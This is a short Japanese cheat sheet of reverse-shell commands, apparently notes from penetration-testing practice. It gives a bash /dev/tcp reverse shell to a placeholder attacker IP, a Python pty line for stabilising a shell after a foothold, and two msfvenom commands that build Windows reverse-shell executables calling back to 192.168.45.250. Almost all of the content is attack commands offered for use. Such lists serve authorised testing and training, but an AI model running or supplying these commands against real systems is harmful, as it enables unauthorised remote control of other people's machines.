# reverse shell取得のためのスクリプトまとめ
[windows用リバースシェル生成チートシート](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)

1. 安定するが、root権限ないと動かないこともある。また、経験上4444だとダメで443だといける？みたいなケースがあった。
```.sh
bash -c "bash -i >& /dev/tcp/<attacker IP>/4444 0>&1"
```

2. footholdを取った後にシェルを安定させることができる。
```
python -c 'import pty;pty.spawn("/bin/sh")'
```

3. x86のWindows用にリバースシェルのstagedなpayloadを生成する。
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.250 LPORT=445 -f exe > hoge.exe
```

4. x64のWindows用にリバースシェルのstagelessなペイロードを生成する。
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.250 LPORT=445 -f exe > hoge.exe
```